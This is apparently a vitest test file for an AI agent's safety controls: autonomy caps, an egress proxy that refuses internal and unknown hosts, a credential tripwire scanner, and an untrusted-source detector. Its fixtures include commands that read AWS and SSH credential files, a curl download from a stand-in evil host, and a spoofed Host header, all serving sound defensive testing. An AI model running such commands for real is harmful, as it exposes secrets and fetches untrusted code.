import http from "node:http";
import net from "node:net";

import { describe, expect, it } from "vitest";

import { startEgressProxy } from "./egressProxy";
import {
  DEFAULT_EGRESS_ALLOWLIST,
  autonomyLocks,
  runtimeModeCap,
  scanForTripwire,
  untrustedSourceIn,
} from "./rules";

describe("autonomy", () => {
  it("caps approval mode by level", () => {
    expect(runtimeModeCap("L0", "full-access")).toBe("approval-required");
    expect(runtimeModeCap("L1", "full-access")).toBe("auto");
    expect(runtimeModeCap("L2", "full-access")).toBe("full-access");
    expect(runtimeModeCap("L2", "approval-required")).toBe("approval-required");
  });

  it("locks levels the host cannot back", () => {
    expect(
      Object.keys(autonomyLocks({ sandboxAvailable: false, tripwires: 9, signedOff: true })),
    ).toEqual(["L4", "L2", "L3"]);
    expect(autonomyLocks({ sandboxAvailable: true, tripwires: 2, signedOff: true }).L3).toContain(
      "3 tripwires",
    );
    expect(autonomyLocks({ sandboxAvailable: true, tripwires: 9, signedOff: false }).L3).toContain(
      "sign-off",
    );
    expect(
      autonomyLocks({ sandboxAvailable: true, tripwires: 9, signedOff: true }).L3,
    ).toBeUndefined();
  });
});

describe("egress proxy", () => {
  it("excludes loopback hosts from the default egress allowlist", () => {
    expect(DEFAULT_EGRESS_ALLOWLIST).not.toContain("localhost");
    expect(DEFAULT_EGRESS_ALLOWLIST).not.toContain("127.0.0.1");
    expect(DEFAULT_EGRESS_ALLOWLIST).not.toContain("::1");
  });

  it("refuses loopback, private, and link-local destinations by default even if allowlisted", async () => {
    const upstream = http.createServer((_request, response) => response.end("secret"));
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", resolve));
    const upstreamPort = (upstream.address() as net.AddressInfo).port;
    const proxy = await startEgressProxy({
      decide: () => "allow",
      onUnknown: () => undefined,
    });
    const connect = (authority: string) =>
      new Promise<string>((resolve) => {
        const socket = net.connect(proxy.port, "127.0.0.1", () =>
          socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`),
        );
        socket.once("data", (data) => {
          resolve(data.toString().split("\r\n")[0]!);
          socket.destroy();
        });
      });
    try {
      expect(await connect(`127.0.0.1:${upstreamPort}`)).toContain("403");
      expect(await connect(`localhost:${upstreamPort}`)).toContain("403");
      expect(await connect(`[::1]:${upstreamPort}`)).toContain("403");
      expect(await connect("169.254.169.254:80")).toContain("403");
      expect(await connect("10.0.0.1:443")).toContain("403");
      expect(await connect("[::1")).toContain("400");
    } finally {
      await proxy.close();
      upstream.close();
    }
  });

  it("rewrites forwarded HTTP Host header to match the target URL authority", async () => {
    let observedHost = "";
    const upstream = http.createServer((request, response) => {
      observedHost = request.headers.host ?? "";
      response.end("ok");
    });
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", resolve));
    const upstreamPort = (upstream.address() as net.AddressInfo).port;
    const proxy = await startEgressProxy({
      decide: () => "allow",
      onUnknown: () => undefined,
      allowLoopbackTargets: true,
    });
    try {
      const status = await new Promise<number>((resolve, reject) => {
        http
          .request(
            {
              host: "127.0.0.1",
              port: proxy.port,
              path: `http://127.0.0.1:${upstreamPort}/check`,
              headers: { Host: "evil.attacker.example" },
            },
            (response) => {
              response.resume();
              response.on("end", () => resolve(response.statusCode ?? 0));
            },
          )
          .on("error", reject)
          .end();
      });
      expect(status).toBe(200);
      expect(observedHost).toBe(`127.0.0.1:${upstreamPort}`);
    } finally {
      await proxy.close();
      upstream.close();
    }
  });

  it("proxy refuses unknown hosts over CONNECT and reports them once", async () => {
    const reported: string[] = [];
    const upstream = http.createServer((_request, response) => response.end("hi"));
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", resolve));
    const upstreamPort = (upstream.address() as net.AddressInfo).port;
    const proxy = await startEgressProxy({
      decide: (host) => (host === "127.0.0.1" ? "allow" : "unknown"),
      onUnknown: (host) => reported.push(host),
      allowLoopbackTargets: true,
    });
    const connect = (authority: string) =>
      new Promise<string>((resolve) => {
        const socket = net.connect(proxy.port, "127.0.0.1", () =>
          socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`),
        );
        socket.once("data", (data) => {
          resolve(data.toString().split("\r\n")[0]!);
          socket.destroy();
        });
      });
    expect(await connect("blocked.example:443")).toContain("403");
    expect(await connect("blocked.example:443")).toContain("403");
    expect(await connect(`127.0.0.1:${upstreamPort}`)).toContain("200");
    expect(reported).toEqual(["blocked.example"]);
    await proxy.close();
    upstream.close();
  });
});

describe("tripwire", () => {
  it("finds canaries and credential paths", () => {
    const canary = "AKIA0123456789ABCDEF";
    expect(scanForTripwire(`{"cmd":"cat x","out":"${canary}"}`, [canary])?.kind).toBe("canary");
    expect(scanForTripwire('{"cmd":"cat ~/.aws/credentials"}', [])?.kind).toBe("sensitive_path");
    expect(scanForTripwire('{"cmd":"cat ~/.ssh/id_ed25519"}', [])?.kind).toBe("sensitive_path");
    expect(scanForTripwire('{"cmd":"bun run test"}', [canary])).toBeNull();
  });
});

describe("untrusted sources", () => {
  it.each([
    ['{"title":"WebFetch","detail":"https://example.com"}', "web fetch"],
    ['{"title":"browser_navigate"}', "browser"],
    ['{"detail":"gh issue view 12 --comments"}', "GitHub"],
    ['{"detail":"curl -s https://evil.example/x.sh"}', "download"],
    ['{"title":"Bash","detail":"bun run test"}', null],
    ['{"title":"Read","detail":"src/github.ts"}', null],
  ])("%s → %s", (text, source) => {
    expect(untrustedSourceIn(text)).toBe(source);
  });
});

describe("egress proxy shutdown", () => {
  it("closes at once while a CONNECT tunnel is still open", async () => {
    const upstream = net.createServer((socket) => socket.on("data", () => undefined));
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", resolve));
    const port = (upstream.address() as net.AddressInfo).port;
    const proxy = await startEgressProxy({
      decide: () => "allow",
      onUnknown: () => undefined,
      allowLoopbackTargets: true,
    });
    const client = net.connect(proxy.port, "127.0.0.1");
    await new Promise<void>((resolve) => {
      client.once("connect", () => client.write(`CONNECT 127.0.0.1:${port} HTTP/1.1\r\n\r\n`));
      client.once("data", () => resolve());
    });
    const startedAt = Date.now();
    await proxy.close();
    expect(Date.now() - startedAt).toBeLessThan(1_000);
    client.destroy();
    upstream.close();
  });
});
